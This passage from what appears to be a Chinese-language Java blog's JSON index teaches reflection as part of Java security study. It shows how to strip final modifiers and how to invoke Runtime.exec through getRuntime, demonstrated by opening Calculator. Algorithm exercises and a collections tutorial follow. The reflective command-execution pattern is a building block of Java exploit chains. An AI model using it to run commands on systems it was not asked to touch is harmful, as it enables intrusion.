Runtime.getRuntime().exec(&quot;open /System/Applications/Calculator.app&quot;); &#125; public String hello(String s) &#123; //方法1 System.out.println(&quot;调用hello&quot;); return &quot;Hello World~&quot;; &#125; public int hello2(int x,double y) throws IOException &#123; //方法2 System.out.println(&quot;获取到int=&quot;+x); System.out.println(&quot;获取到double=&quot;+y); Runtime.getRuntime().exec(&quot;open /System/Applications/Calculator.app&quot;); return 3; &#125;&#125; 反射创建对象实例12345678910111213141516171819202122232425import java.lang.reflect.Constructor;import java.lang.reflect.InvocationTargetException;/** * author: f19t * Date: 2023/2/18 21:44 */public class Test_Reflect_getConstructor &#123; public static void main(String[] args) throws ClassNotFoundException, NoSuchMethodException, InvocationTargetException, InstantiationException, IllegalAccessException &#123; Class c = Class.forName(&quot;Test&quot;); Constructor ct1 = c.getConstructor();//不会初始化，无参构造 Test obj = (Test)ct1.newInstance();//初始化执行 obj.hello(&quot;test&quot;); Class partypes[] = new Class[2]; partypes[0] = Integer.TYPE; partypes[1] = Double.TYPE; Constructor ct2 = c.getConstructor(partypes);//不会初始化，有参构造 Object arglist[] = new Object[2]; arglist[0] = new Integer(37); arglist[1] = new Double(47.0); Object obj2 = ct2.newInstance(arglist);//有参生成对象 &#125;&#125; 反射获取类方法123456789101112131415161718192021222324import java.lang.reflect.Method;/** * author: f19t * Date: 2023/2/18 19:12 */public class Test_Reflect_methods &#123;public static void main(String[]args) throws ClassNotFoundException &#123; Class c = Class.forName(&quot;java.lang.Runtime&quot;);//获取类 Method methods[] = c.getDeclaredMethods();//获取所有方法 for (int i = 0; i &lt; methods.length; i++) &#123; Method m = methods[i]; Class pvec[] =m.getParameterTypes();// System.out.println(&quot;类名=&quot; +m.getDeclaringClass());//获取类名 System.out.println(&quot;方法=&quot;+m.getName());//获取方法名 for (int q = 0; q &lt; pvec.length; q++) &#123; System.out.println(&quot;参数类型&quot;+pvec[q].getName()); //获取方法参数 &#125; System.out.println(&quot;返回类型=&quot;+m.getReturnType());//获取返回类型 System.out.println(&quot;-----------------------------&quot;); &#125;&#125;&#125; 获取字段123456789101112131415161718192021222324import java.lang.reflect.Field;import java.lang.reflect.Modifier;/** * author: f19t * Date: 2023/2/18 20:43 */public class Test_Reflect_field &#123; public static void main(String[] args) throws ClassNotFoundException, IllegalAccessException, InstantiationException &#123; Class c = Class.forName(&quot;Test&quot;); Field fieldlist[] = c.getDeclaredFields(); for (int i = 0; i &lt; fieldlist.length; i++) &#123; fieldlist[i].setAccessible(true); System.out.println(&quot;字段名=&quot;+fieldlist[i].getName()); System.out.println(&quot;字段值=&quot;+fieldlist[i].get(c.newInstance()));//get方法需要传入实例对象 System.out.println(&quot;字段类型=&quot;+fieldlist[i].getType()); int mod = fieldlist[i].getModifiers(); System.out.println(&quot;声明类型=&quot;+ Modifier.toString(mod)); System.out.println(&quot;----------------------------&quot;); &#125; &#125;&#125; 运行结果 12345678910111213141516171819字段名=h无参构造函数字段值=5字段类型=int声明类型=public static final----------------------------字段名=s无参构造函数字段值=test字段类型=class java.lang.String声明类型=public----------------------------字段名=b无参构造函数字段值=false字段类型=boolean声明类型=public static final---------------------------- 修改字段反射修改注意如果是static final修饰的，需要先去掉final，再次进行修改，还需要注意，static final修饰的直接赋值还是间接赋值，直接赋值只能通过反射获取修改后的数据（编译优化导致）。间接赋值的可以直接获取修改后的数据。 1234567891011121314151617181920212223242526272829303132333435363738394041424344import java.io.IOException;import java.lang.reflect.Constructor;import java.lang.reflect.Field;import java.lang.reflect.InvocationTargetException;import java.lang.reflect.Modifier;/** * author: f19t * Date: 2023/2/18 22:03 */public class Test_Reflect_Set_field &#123; public static void main(String[] args) throws ClassNotFoundException, NoSuchMethodException, InvocationTargetException, InstantiationException, IllegalAccessException, NoSuchFieldException, IOException &#123; Class c = Class.forName(&quot;Test&quot;); Field field[] = c.getDeclaredFields(); Test obj = (Test) c.newInstance(); for (int i = 0; i &lt; field.length; i++) &#123; System.out.println(&quot;修改前的值&quot;+field[i].getName()+&quot;=&quot;+field[i].get(obj)+&quot; 类型为 &quot;+Modifier.toString(field[i].getModifiers())); &#125; System.out.println(&quot;------------------&quot;); field[0].setAccessible(true); Field modifiers = field[0].getClass().getDeclaredField(&quot;modifiers&quot;); modifiers.setAccessible(true); modifiers.setInt(field[0], field[0].getModifiers() &amp; ~Modifier.FINAL); field[0].set(obj, 10); System.out.println(&quot;反射修改后直接获取&quot;+field[0].getName()+&quot;=&quot;+obj.h); System.out.println(&quot;反射修改后反射获取&quot;+field[0].getName()+&quot;=&quot;+field[0].get(obj)); System.out.println(&quot;--------------------&quot;); field[1].setAccessible(true); modifiers.setInt(field[1], field[1].getModifiers() &amp; ~Modifier.FINAL); field[1].set(obj, &quot;hack&quot;); System.out.println(&quot;反射修改后直接获取&quot;+field[1].getName()+&quot;=&quot;+obj.s); System.out.println(&quot;反射修改后反射获取&quot;+field[1].getName()+&quot;=&quot;+field[1].get(obj)); System.out.println(&quot;--------------------&quot;); field[2].setAccessible(true); modifiers.setInt(field[2], field[2].getModifiers() &amp; ~Modifier.FINAL); field[2].set(obj, true); System.out.println(&quot;反射修改后直接获取&quot;+field[2].getName()+&quot;=&quot;+obj.b); System.out.println(&quot;反射修改后反射获取&quot;+field[2].getName()+&quot;=&quot;+field[2].get(obj)); &#125;&#125; 运行结果： 12345678910111213无参构造函数修改前的值h=5 类型为 public static final修改前的值s=test 类型为 public修改前的值b=false 类型为 public static final------------------反射修改后直接获取h=5反射修改后反射获取h=10--------------------反射修改后直接获取s=hack反射修改后反射获取s=hack--------------------反射修改后直接获取b=true反射修改后反射获取b=true 调用方法常规类调用方法常规类调用方法流程为获取类、创建实例、执行方法 1234567891011121314151617181920212223import java.lang.reflect.InvocationTargetException;import java.lang.reflect.Method;/** * author: f19t * Date: 2023/2/18 21:22 */public class Test_Reflect_Get_methods &#123; public static void main(String[] args) throws ClassNotFoundException, NoSuchMethodException, InvocationTargetException, IllegalAccessException &#123; Class c = Class.forName(&quot;Test&quot;); Class partypes[] = new Class[2]; partypes[0] = Integer.TYPE; partypes[1] = Double.TYPE; Method meth = c.getMethod(&quot;hello2&quot;, partypes); Test test = new Test(); Object arglist[] = new Object[2]; arglist[0] = new Integer(3); arglist[1] = new Double(3.1); Object ref = meth.invoke(test, arglist); System.out.println(ref); &#125;&#125; 单例类调用方法单例模式的特点 单例类只能有一个实例。 单例类必须自己创建自己的唯一实例。 单例类必须给所有其他对象提供这一实例。 单例模式保证了全局对象的唯一性，比如系统启动读取配置文件就需要单例保证配置的一致性。 java.lang.Runtime就是一个单例模式 1234567891011121314151617public class Runtime &#123; private static Runtime currentRuntime = new Runtime(); /** * Returns the runtime object associated with the current Java application. * Most of the methods of class &lt;code&gt;Runtime&lt;/code&gt; are instance * methods and must be invoked with respect to the current runtime object. * * @return the &lt;code&gt;Runtime&lt;/code&gt; object associated with the current * Java application. */ public static Runtime getRuntime() &#123; return currentRuntime; &#125; /** Don&#x27;t let anyone else instantiate this class */ private Runtime() &#123;&#125; Runtime的Runtime.exec调用注意点，invoke作用是执行方法，第一个参数为： 如果是普通方法执行invoke，第一个参数放对象的实例； 如果是静态方法执行invoke，可以放null或类名； 放调用代码 123456789101112131415161718import java.lang.reflect.Constructor;import java.lang.reflect.InvocationTargetException;import java.lang.reflect.Method;/** * author: f19t * Date: 2023/2/18 21:22 */public class Test_Reflect_Get_methods &#123; public static void main(String[] args) throws ClassNotFoundException, NoSuchMethodException, InvocationTargetException, IllegalAccessException, InstantiationException &#123; Class c = Class.forName(&quot;java.lang.Runtime&quot;); Method method = c.getDeclaredMethod(&quot;exec&quot;, String.class); Method method1 = c.getDeclaredMethod(&quot;getRuntime&quot;); Object obj = method1.invoke(null);//因为getRuntime为静态方法，并且return也是Runtime method.invoke(obj, &quot;open /System/Applications/Calculator.app&quot;); &#125;&#125;","categories":[{"name":"JAVA安全","slug":"JAVA安全","permalink":"https://f19t.github.io.git/categories/JAVA%E5%AE%89%E5%85%A8/"}],"tags":[{"name":"JAVASEC","slug":"JAVASEC","permalink":"https://f19t.github.io.git/tags/JAVASEC/"}]},{"title":"NYOJ58-广度优先搜索算法","slug":"NYOJ58-广度优先搜索算法","date":"2023-02-17T12:28:31.000Z","updated":"2023-02-17T12:31:28.493Z","comments":true,"path":"2023/02/17/NYOJ58-广度优先搜索算法/","link":"","permalink":"https://f19t.github.io.git/2023/02/17/NYOJ58-%E5%B9%BF%E5%BA%A6%E4%BC%98%E5%85%88%E6%90%9C%E7%B4%A2%E7%AE%97%E6%B3%95/","excerpt":"NYOJ-58-广度优先搜索算法最近三天学习了深度优先算法，并做了一道oj题，遇到了一些问题，并解决了一些问题，这里记录一下。","text":"NYOJ-58-广度优先搜索算法最近三天学习了深度优先算法，并做了一道oj题，遇到了一些问题，并解决了一些问题，这里记录一下。 题目描述：描述这有一个迷宫，有0~8行和0~8列： 1,1,1,1,1,1,1,1,1 1,0,0,1,0,0,1,0,1 1,0,0,1,1,0,0,0,1 1,0,1,0,1,1,0,1,1 1,0,0,0,0,1,0,0,1 1,1,0,1,0,1,0,0,1 1,1,0,1,0,1,0,0,1 1,1,0,1,0,0,0,0,1 1,1,1,1,1,1,1,1,1 0表示道路，1表示墙。现在输入一个道路的坐标作为起点，再如输入一个道路的坐标作为终点，问最少走几步才能从起点到达终点？（注：一步是指从一坐标点走到其上下左右相邻坐标点，如：从（3，1）到（4,1）。） 输入描述第一行输入一个整数n（0&lt;n&lt;&#x3D;100），表示有n组测试数据;随后n行,每行有四个整数a,b,c,d（0&lt;&#x3D;a,b,c,d&lt;&#x3D;8）分别表示起点的行、列，终点的行、列。 输出描述 输出最少走几步。 解题源码12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576777879808182838485868788899091929394import java.util.*;public class OJ58 &#123; static int[][] walked =new int[9][9]; //记录那些路径走过 static Queue&lt;location&gt; queue = new LinkedList&lt;location&gt;();//创建队列，将所有的位置都走一遍 static int[][] map=&#123;&#123;1,1,1,1,1,1,1,1,1&#125;, &#123;1,0,0,1,0,0,1,0,1&#125;, &#123;1,0,0,1,1,0,0,0,1&#125;, &#123;1,0,1,0,1,1,0,1,1&#125;, &#123;1,0,0,0,0,1,0,0,1&#125;, &#123;1,1,0,1,0,1,0,0,1&#125;, &#123;1,1,0,1,0,1,0,0,1&#125;, &#123;1,1,0,1,0,0,0,0,1&#125;, &#123;1,1,1,1,1,1,1,1,1&#125;&#125;; public static void main(String[] args) &#123; Scanner in =new Scanner(System.in); int n = in.nextInt(); for (int i = 0; i &lt; n; i++) &#123; int a = in.nextInt(); int b = in.nextInt(); int c = in.nextInt(); int d = in.nextInt(); if (a == c &amp;&amp; b == d) &#123; System.out.println(0); continue; &#125; move(a, b,0); while (queue.size() != 0) &#123; location laca = queue.poll();// System.out.print(&quot;走过(&quot;);// System.out.print(laca.x);// System.out.print(&quot;,&quot;);// System.out.print(laca.y);// System.out.print(&quot;)位置&quot;);// System.out.print(&quot;，步数&quot;);// System.out.println(laca.step); if (laca.x == c &amp;&amp; laca.y == d) &#123; System.out.println(laca.step); queue.clear(); for (int w = 0; w &lt; 9; w++) &#123; Arrays.fill(walked[w], 0);//二维数组全部赋值为0 &#125; break; &#125; else &#123; move(laca.x,laca.y, laca.step); &#125; &#125; &#125; &#125; private static void move(int x, int y, int steps) &#123; //每个点上下左右移动 ArrayList&lt;Integer&gt; list = new ArrayList&lt;Integer&gt;(); list.add(1); list.add(-1); for (int i : list) &#123; if (x + i &gt; -1 &amp;&amp; x + i &lt;= 8 &amp;&amp; walked[x + i][y] == 0 &amp;&amp; map[x + i][y] == 0) &#123; walked[x + i][y] = 1; location laca = new location(); laca.x = x + i; laca.y = y; laca.step =steps+1; queue.offer(laca); &#125; &#125; for (int i : list) &#123; if (y + i &gt; -1 &amp;&amp; y + i &lt;= 8 &amp;&amp; walked[x][y + i] == 0 &amp;&amp; map[x][y + i] == 0) &#123; walked[x][y + i] = 1; location laca = new location(); laca.x = x; laca.y = y+i; laca.step = steps+1; queue.offer(laca); &#125; &#125; &#125;&#125;class location &#123; int x; int y; int step;&#125; 遇到的问题java结构体java没有结构体，Queue E是泛型 可以自己构建类去充当元素，使用object &#x3D;null去释放赋值对象。 123456789//Interface Queue&lt;E&gt;class location &#123; int x; int y; int step;&#125;location laca = new location();queue.offer(laca); 多维数组赋值为0java.util.Arrays.fill()方法处理的是一维数组，处理二维数组使用： 123for (int w = 0; w &lt; 9; w++) &#123; Arrays.fill(walked[w], 0);//二维数组全部赋值为0&#125; 心得广度优先搜索可以解决最短路径问题，像火一样蔓延，一层层去查找。","categories":[{"name":"OJ","slug":"OJ","permalink":"https://f19t.github.io.git/categories/OJ/"}],"tags":[{"name":"算法","slug":"算法","permalink":"https://f19t.github.io.git/tags/%E7%AE%97%E6%B3%95/"}]},{"title":"NYOJ-32-深度优先搜索算法","slug":"NYOJ32-深度优先搜索算法","date":"2023-02-15T03:24:28.000Z","updated":"2023-02-15T07:39:57.412Z","comments":true,"path":"2023/02/15/NYOJ32-深度优先搜索算法/","link":"","permalink":"https://f19t.github.io.git/2023/02/15/NYOJ32-%E6%B7%B1%E5%BA%A6%E4%BC%98%E5%85%88%E6%90%9C%E7%B4%A2%E7%AE%97%E6%B3%95/","excerpt":"NYOJ-32-深度优先搜索算法最近两天学习了深度优先算法，并做了一道oj题，这里记录一下。","text":"NYOJ-32-深度优先搜索算法最近两天学习了深度优先算法，并做了一道oj题，这里记录一下。 题目描述：描述找出从自然数1、2、… 、n（0&lt;n&lt;10）中任取r(0&lt;r&lt;&#x3D;n)个数的所有组合。 输入描述输入n、r。 输出描述按特定顺序输出所有组合。特定顺序：每一个组合中的值从大到小排列，组合之间按逆字典序排列。 123456789101112输入 5 3输出：543542541532531521432431421321 解题代码123456789101112131415161718192021222324252627282930313233343536373839404142import java.util.Scanner;public class NYOJ32 &#123; //组合数，深度优先搜索 static Scanner in =new Scanner(System.in); static int n = in.nextInt(); //读取基础数据 static int r = in.nextInt(); //读取长度 static int[] book = new int[n+1];//标记数据是否被使用 static int[] out = new int[r+1]; //设置输出长度 public static void main(String[] args) &#123; dfs(1); &#125; public static void dfs(int step) &#123; int i = 0; if (step &gt; r) &#123; for (i=1;i&lt;=r-1;i++)&#123; //判断高位大于低位 if (out[i]&lt;out[i+1])&#123; return; &#125; &#125; for (i = 1; i &lt;=r; i++) &#123; System.out.print(out[i]); &#125; System.out.println(&quot;&quot;); return; &#125; for (i = n; i &gt; 0; i--) &#123; //深度优先算法 if (book[i] == 0) &#123; out[step]=i; book[i]=1; dfs(step+1); book[i]=0; &#125; &#125; return; &#125;&#125; 学到了，理解深度优先搜索的关键在于解决 “当下该如何做” 。至于 “下一步如何做” 则与 “当下该如何做” 是一样的。","categories":[{"name":"OJ","slug":"OJ","permalink":"https://f19t.github.io.git/categories/OJ/"}],"tags":[{"name":"算法","slug":"算法","permalink":"https://f19t.github.io.git/tags/%E7%AE%97%E6%B3%95/"}]},{"title":"NYOJ-2-栈的运用","slug":"NYOJ-2","date":"2023-02-13T11:16:31.000Z","updated":"2023-02-19T12:05:23.308Z","comments":true,"path":"2023/02/13/NYOJ-2/","link":"","permalink":"https://f19t.github.io.git/2023/02/13/NYOJ-2/","excerpt":"NYOJ-2-栈的运用今天刚学java集合，学到了栈，就拿这道题练练手吧。 题目描述12输入描述第一行输入一个数N（0&lt;N&lt;=100）,表示有N组测试数据。后面的N行输入多组输入数据，每组输入数据都是一个字符串S(S的长度小于10000，且S不是空串），测试数据组数少于5组。数据保证S中只含有&quot;[&quot;, “]”, “(”, “)” 四种字符 1每组输入数据的输出占一行，如果该字符串中所含的括号是配对的，则输出Yes,如果不配对则输出No","text":"NYOJ-2-栈的运用今天刚学java集合，学到了栈，就拿这道题练练手吧。 题目描述12输入描述第一行输入一个数N（0&lt;N&lt;=100）,表示有N组测试数据。后面的N行输入多组输入数据，每组输入数据都是一个字符串S(S的长度小于10000，且S不是空串），测试数据组数少于5组。数据保证S中只含有&quot;[&quot;, “]”, “(”, “)” 四种字符 1每组输入数据的输出占一行，如果该字符串中所含的括号是配对的，则输出Yes,如果不配对则输出No 解题思路最近刚学了Deque，可以使用栈解决这个问题。思路：获取到”)”、”]”，就比对，不是就压栈，最后判断是否为空。后续有更好思路再补代码。 1234567891011121314151617181920212223242526272829303132333435363738import java.util.Deque;import java.util.LinkedList;import java.util.Scanner;public class OJ2 &#123; public static void main(String[] args) &#123; Scanner in = new Scanner(System.in); int num = in.nextInt(); String arr[] = new String[num]; for (int i = 0; i&lt;num;i++)&#123;arr[i]=in.next();&#125; for (int i = 0; i&lt;num;i++)&#123; String s = judge(arr[i]); System.out.println(s); &#125; &#125; public static String judge(String s)&#123; Deque&lt;String&gt; deque = new LinkedList&lt;&gt;(); for (int i =0;i&lt;s.length();i++)&#123; deque.offerLast(s.substring(i,i+1)); if (deque.peekLast().equals(&quot;)&quot;))&#123; if (deque.size()==1)&#123;return &quot;No&quot;;&#125; deque.pollLast(); if (deque.peekLast().equals(&quot;(&quot;))&#123;deque.removeLast();&#125; else &#123;return &quot;No&quot;;&#125; &#125; else if(deque.peekLast().equals(&quot;]&quot;))&#123; if (deque.size()==1)&#123;return &quot;No&quot;;&#125; deque.pollLast(); if (deque.peekLast().equals(&quot;[&quot;))&#123;deque.removeLast();&#125; else &#123;return &quot;No&quot;;&#125; &#125; &#125; if (deque.size()==0)&#123;return &quot;Yes&quot;;&#125;else &#123;return &quot;No&quot;;&#125; &#125;&#125; 学到了比较值需要使用 .equals() 。","categories":[{"name":"OJ","slug":"OJ","permalink":"https://f19t.github.io.git/categories/OJ/"}],"tags":[{"name":"算法","slug":"算法","permalink":"https://f19t.github.io.git/tags/%E7%AE%97%E6%B3%95/"}]},{"title":"Java集合","slug":"Java集合","date":"2023-02-13T07:38:34.000Z","updated":"2023-03-17T09:52:15.397Z","comments":true,"path":"2023/02/13/Java集合/","link":"","permalink":"https://f19t.github.io.git/2023/02/13/Java%E9%9B%86%E5%90%88/","excerpt":"Java集合本文介绍Java集合的数据结构，与简单测试。为后续学习算法打基础。","text":"Java集合本文介绍Java集合的数据结构，与简单测试。为后续学习算法打基础。 List123456789101112131415import java.util.ArrayList;import java.util.List;public class Test &#123; public static void main(String[] args) &#123; List&lt;String&gt; list = new ArrayList&lt;String&gt;(); list.add(&quot;apple&quot;); // size=1 list.add(&quot;pear&quot;); // size=2 list.add(&quot;apple&quot;); // 允许重复添加元素，size=3 System.out.println(list.size()); list.remove(1);//删除pear System.out.println(list.size()); System.out.println(list.get(1)); &#125;&#125; 12332apple List是一种顺序列表接口常用方法： 在末尾添加一个元素：boolean add(E e) 在指定索引添加一个元素：boolean add(int index, E e) 删除指定索引的元素：E remove(int index) 删除某个元素：boolean remove(Object e) 获取指定索引的元素：E get(int index) 获取链表大小（包含元素的个数）：int size() Map1234567891011121314151617import java.util.HashMap;import java.util.Map;public class Test &#123; public static void main(String[] args) &#123; Map&lt;String, String&gt; map = new HashMap&lt;&gt;(); map.put(&quot;s&quot;,&quot;bbbbb&quot;); map.put(&quot;a&quot;,&quot;aaaaa&quot;); System.out.println(map.get(&quot;s&quot;));//获取数据 for (String key : map.keySet())&#123; //遍历map System.out.println(map.get(key)); &#125; &#125;&#125; 123bbbbbaaaaabbbbb PropertiesJava默认配置文件以.properties为扩展名，每行以key&#x3D;value表示。java内置Properties读取配置文件非常简单。 典型配置文件： 123# setting.propertieslast_open_file=1.txtauto_save_interval=60 12345678910111213141516171819import java.io.FileNotFoundException;import java.util.Properties;public class Test &#123; public static void main(String[] args) throws FileNotFoundException,Exception&#123; String f = &quot;配置文件&quot;; Properties props = new Properties(); props.load(new java.io.FileInputStream(f)); String filepath = props.getProperty(&quot;last_open_file&quot;); String interval = props.getProperty(&quot;auto_save_interval&quot;, &quot;120&quot;);//如果没有值，赋予默认值 System.out.println(filepath); System.out.println(interval); &#125;&#125; 121.txt60 Set只需要存储不重复的key，并不需要存储映射的value，那么就可以使用Set。 Queue队列（Queue）是一种经常使用的集合。Queue实际上是实现了一个先进先出（FIFO：First In First Out）的有序表。它和List的区别在于，List可以在任意位置添加和删除元素，而Queue只有两个操作： 把元素添加到队列末尾； 从队列头部取出元素。 队列接口Queue定义了以下几个方法： int size()：获取队列长度； boolean add(E)&#x2F;boolean offer(E)：添加元素到队尾； E remove()&#x2F;E poll()：获取队首元素并从队列中删除； E element()&#x2F;E peek()：获取队首元素但并不从队列中删除。 123456789101112131415161718192021222324import java.io.FileNotFoundException;import java.util.*;public class Test &#123; public static void main(String[] args) throws FileNotFoundException,Exception&#123; Queue&lt;String&gt; q = new LinkedList&lt;&gt;(); q.offer(&quot;aaaaaaa&quot;); q.offer(&quot;bbbbbbb&quot;); q.offer(&quot;ccccccc&quot;); System.out.println(q.peek());//获取首位数据，不删除 System.out.println(q.peek()); System.out.println(q.peek()); System.out.println(&quot;-------------&quot;); System.out.println(q.poll());//获取首位数据，并删除 System.out.println(q.poll()); System.out.println(q.poll()); &#125;&#125; 1234567aaaaaaaaaaaaaaaaaaaaa-------------aaaaaaabbbbbbbccccccc Deque两头都出，这种队列叫双端队列（Double Ended Queue），学名Deque。Java集合提供了接口Deque来实现一个双端队列，它的功能是： 既可以添加到队尾，也可以添加到队首； 既可以从队首获取，又可以从队尾获取。 用处：Deque当Stack使用。 123456789101112131415161718192021222324import java.io.FileNotFoundException;import java.util.*;public class Test &#123; public static void main(String[] args) throws FileNotFoundException,Exception&#123; Deque&lt;String&gt; q = new LinkedList&lt;&gt;(); q.offerLast(&quot;aaaaaaa&quot;); q.offerLast(&quot;bbbbbbb&quot;); q.offerLast(&quot;ccccccc&quot;); System.out.println(q.peekLast());//获取末位数据，不删除 System.out.println(q.peekLast()); System.out.println(q.peekLast()); System.out.println(&quot;-------------&quot;); System.out.println(q.pollLast());//获取末位数据，并删除 System.out.println(q.pollLast()); System.out.println(q.pollLast()); &#125;&#125; 1234567ccccccccccccccccccccc-------------cccccccbbbbbbbaaaaaaa","categories":[{"name":"JAVA基础","slug":"JAVA基础","permalink":"https://f19t.github.io.git/categories/JAVA%E5%9F%BA%E7%A1%80/"}],"tags":[{"name":"算法","slug":"算法","permalink":"https://f19t.github.io.git/tags/%E7%AE%97%E6%B3%95/"}]}],"categories":[{"name":"JS对抗","slug":"JS对抗","permalink":"https://f19t.github.io.git/categories/JS%E5%AF%B9%E6%8A%97/"},{"name":"应急响应","slug":"应急响应","permalink":"https://f19t.github.io.git/categories/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/"},{"name":"JAVA安全","slug":"JAVA安全","permalink":"https://f19t.github.io.git/categories/JAVA%E5%AE%89%E5%85%A8/"},{"name":"漏洞分析","slug":"漏洞分析","permalink":"https://f19t.github.io.git/categories/%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/"},{"name":"OJ","slug":"OJ","permalink":"https://f19t.github.io.git/categories/OJ/"},{"name":"JAVA基础","slug":"JAVA基础","permalink":"https://f19t.github.io.git/categories/JAVA%E5%9F%BA%E7%A1%80/"}],"tags":[{"name":"js","slug":"js","permalink":"https://f19t.github.io.git/tags/js/"},{"name":"linux","slug":"linux","permalink":"https://f19t.github.io.git/tags/linux/"},{"name":"文件上传","slug":"文件上传","permalink":"https://f19t.github.io.git/tags/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/"},{"name":"JAVASEC","slug":"JAVASEC","permalink":"https://f19t.github.io.git/tags/JAVASEC/"},{"name":"log4j2","slug":"log4j2","permalink":"https://f19t.github.io.git/tags/log4j2/"},{"name":"shiro","slug":"shiro","permalink":"https://f19t.github.io.git/tags/shiro/"},{"name":"算法","slug":"算法","permalink":"https://f19t.github.io.git/tags/%E7%AE%97%E6%B3%95/"}]}